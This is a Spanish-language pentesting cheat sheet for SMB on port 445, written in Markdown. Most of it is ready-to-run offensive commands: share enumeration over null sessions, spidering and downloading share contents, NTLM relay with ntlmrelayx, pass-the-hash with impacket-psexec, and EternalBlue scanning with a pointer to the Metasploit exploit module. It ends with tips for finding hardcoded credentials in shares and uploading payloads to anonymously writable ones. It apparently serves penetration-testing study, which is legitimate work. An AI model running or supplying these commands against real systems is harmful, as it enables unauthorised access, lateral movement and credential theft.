# 445 — SMB

---

## Enumeración

```bash
# Nmap
sudo nmap -sC -sV -p 139,445 <IP>
sudo nmap --script "smb-vuln-*" <IP>      # buscar EternalBlue, MS17-010, etc.

# NXC
nxc smb <IP> -u '' -p '' --users          # null session
nxc smb <IP> -u usuario -p contraseña --shares
nxc smb <IP> -u usuario -p contraseña -M spider_plus -o DOWNLOAD_FLAG=True

# smbclient
smbclient -L //<IP>/ -N                   # listar shares sin creds
smbclient //<IP>/share -U usuario         # conectar a share
smbclient \\\\<IP>\\                      # sintaxis Windows

# smbmap
smbmap -H <IP>
smbmap -H <IP> -u usuario -p contraseña
smbmap -H <IP> --download "share\archivo.txt"
smbmap -H <IP> --upload test.txt "share\test.txt"

# enum4linux
enum4linux -a <IP>
```

## Ataques

```bash
# NTLM Relay (requiere SMB Signing deshabilitado)
nxc smb <RED>/24 --gen-relay-list relay_targets.txt   # encontrar objetivos
ntlmrelayx.py -tf relay_targets.txt -smb2support

# PsExec (con hash o contraseña)
impacket-psexec dominio/usuario:contraseña@<IP>
impacket-psexec -hashes :NTLM_HASH dominio/usuario@<IP>

# EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 <IP>
# → explotar con metasploit: exploit/windows/smb/ms17_010_eternalblue
```

---

## Qué buscar en shares

- Archivos `.xml`, `.ini`, `.conf`, `.config`, `.bat` → credenciales hardcodeadas
- Scripts de administración con contraseñas
- Backups de bases de datos
- Shares con escritura anónima → subir payloads
